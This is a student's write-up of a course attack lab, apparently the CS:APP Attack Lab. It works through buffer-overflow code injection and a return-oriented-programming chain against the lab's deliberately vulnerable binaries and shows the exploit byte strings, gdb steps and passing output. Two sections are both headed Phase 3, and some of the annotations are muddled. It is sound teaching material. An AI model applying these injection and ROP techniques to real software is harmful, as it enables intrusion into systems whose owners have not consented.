CSCI 3160 Attack Lab Writeup
Jacob Hebert, Target 417

# Phase 1
We completed the first phase as a class, this involved finding the correct memory address to exploit and sending a string the same size as the buffer to corrupt it. Doing this would corrupt the stack and crash the program. We achieved this by looking at the assembly dump of the file and determining not only the correct address, but also the correct size for the attack string. We did this by examining the `touch1` function and the `getbuf` function, both of which provided enough information for us to make the attack. My buffer was 0x18 or 24 bytes in size, so I filled the buffer with 24 bytes of zeros and completed the first phase.

# Phase 3
Phase 2 required us to inject some code into the program by overflowing the buffer and setting the program to a specific point in the code, into touch2. We then had to figure out the kind of injection needed. The first thing I did, after writing phase1’s section was realize that the buffer overflow was the same for all phases requiring ctarget, since that’s the only input that we have in the program. I created the level2 file and pasted the buffer overflow bytes  in, and picked a spot in `touch2` to start from, and I got a “Misfire!”. At least I was in the right spot!

Cookie: 0x23f306d5

Type string:Misfire: You called touch2(0x00406520)

I started by trying to follow the hints, which led me to find assembly code to inject the cookie right before the return statement in the `getbuf` function, then using the next part of the injection to put the code in the right address space for touch2 to take over. I realized quickly that I was getting nowhere with the assembly injection because I wasn’t able to get the program to run without immediately seg faulting. So I rethought my ideas and tried to reformat my attack file to actually follow the hints. 
The first part of phase 2 took me about 2 hours to realize I hit a dead end.

My friend Deep gave me some insight on how to actually complete this part of the lab, which was really simple in hindsight:

    1. Find the return address of getbuf
    2. Find the return address of touch2
    3. Inject code in the buffer to alter the value of %rdi

The cookie was the value to inject, and a movq asm command made the most sense, so
    `movq $0x23f306d5, %rdi`

I needed to translate this from text to the binary form, so running
    `as ctarget_l2_inject.s -o ctarget_l2_inject.o`
generated the needed output, which when objdumped gave:
    `48 c7 c7 d5 06 f3 23`
    `c3` is retq in asm, so that would be at the 8th byte.


    (gdb) until *0x401daa
    gdb) x/s $rsp
    (Address of register) 0x5551fa10:

Injection script:

> ```C
>/* Injection string */
>/* First 8 bytes are movq to rsi, rest to overflow getbuf */
>
>48 c7 c7 d5 06 f3 23 c3
>00 00 00 00 00 00 00 00
>00 00 00 00 00 00 00 00
>
>
>/* 0x5551fa10 = ret addr for getbuf */
>10 fa 51 55 00 00 00 00
>
>
>
>/* Address of touch2 */
>f4 1d 40 00 00 00 00 00
>```

At first the injection caused a seg fault, but it was likely caused by comments, because shortly after, I ran it again and it passed
    
    ```bash
        ./hex2raw < ctarget.lv2 | ./ctarget
        Cookie: 0x23f306d5
        Type string:Touch2!: You called touch2(0x23f306d5)
        Valid solution for level 2 with target ctarget
        PASS
    ```


# Phase 3

I needed to pass the cookie as a string -- so I need to translate the hex cookie to a set of ascii characters


1. We need to inject the cookie into the return address of touch3

Need to use a movq instruction to move the location of the cookie to the register at the time needed
Add 0x28 to account for buffer and size of rsp and touch3. 0x18 for the buffer, 0x8 for rsp, and 0x8 for touch3.

The new memory address is: 0x5551fa10 + 0x28 = **0x5551fa38**. This gets injected in the first line of the buffer overflow.


2. add the return address for getbuf
    `10 fa 51 55 00 00 00 00`

3. ret address for touch3
    `11 1f 40 00 00 00 00 00`

4. Translate hex to ASCII
    `32 33 66 33 30 36 64 35 00` *plus an extra byte of zeroes*

    Script:

>    ```c
>   /* movq cookie location -> rdi and retq */
>   /* 10 fa 51 55 */
>   /* 0x5551fa10 + 0x28 = 0x5551fa38 */
>
>
>   48 c7 c7 38 fa 51 55 c3
>   00 00 00 00 00 00 00 00
>   00 00 00 00 00 00 00 00
>
>   /* retaddr of getbuf */
>   10 fa 51 55 00 00 00 00
>
>   /* retaddr of touch3 */
>   /* 0x401f11          */
>
>   11 1f 40 00 00 00 00 00
>
>   /* Hex translation of cookie */
>   32 33 66 33 30 36 64 35 00 
>```

```bash
    Cookie: 0x23f306d5
    Type string:Touch3!: You called touch3("23f306d5")
    Valid solution for level 3 with target ctarget
    PASS
    ```
With Deep's help, this took me about half an hour to complete.


# Phase 4

ROP is hard...
The first thing I did was find the gadget farm in the address space.
```bash
    objdump -d rtarget | sed -n '/start_farm/,/end_farm/p' >> farm.dump
```
This finds the entire codespace from the start to the end of the farm

Using the farm, I made some grep statements to find the patterns that I needed for execution

    /* popq %rdi , 5f */
    /* popq %rax, 58 -> setval_269 */
    /* c4 = c7, 2 more places is 58 */

I started with these, I grepped to a spot that would have 5f or 58, for me, setval_269 had the value I needed,
it was located at c4, but 2 bytes into the address, so I had to add 2 to my inject, starting at c6.
That popped %rax from the stack.

I used that to put the cookie on the stack.

    /* movq rdi rax */
    /* cat farm.dump | grep -E "48 89 .. c3"  */
I didn't know the exact 3rd byte to look for, so I used extended regex to find it somewhere in the farm, which resulted in:
    ```bash
         401fcf:       b8 48 89 c7 c3          mov    $0xc3c78948,%eax
    ```
The start of the string I wanted was one byte in, so I added 1 to the address, making my address: `d0 1f 40 00 00 00 00 00`

The last thing was to inject the return address of touch2, which was already in ctarget.lv2, so I just copy/pasted that.

ROP Attack:

>   /* Cookie: 0x23f306d5 */
>
>   /* Fill buffer to 24 bytes */
>
>   00 00 00 00 00 00 00 00
>   00 00 00 00 00 00 00 00
>   00 00 00 00 00 00 00 00
>   /* popq %rdi , 5f */
>   /* popq %rax, 58 -> setval_269 */
>   /* c4 = c7, 2 more places is 58 */
>   c6 1f 40 00 00 00 00 00
>
>   /* cookie */
>   d5 06 f3 23 00 00 00 00
>
>   /* movq rdi rax */
>   /* cat farm.dump | grep -E "48 89 .. c3"  */
>
>   /* 401fcf:       b8 48 89 c7 c3          mov    $0xc3c78948,%eax */
>
>   d0 1f 40 00 00 00 00 00
>
>   /* Ret addr of touch2 */
>
>   f4 1d 40 00 00 00 00 00



```bash
    Cookie: 0x23f306d5
    Type string:Touch2!: You called touch2(0x23f306d5)
    Valid solution for level 2 with target rtarget
    PASS


    ```


Deep helped me significantly with this lab. Without him, I would not have been able to get to phase 4.
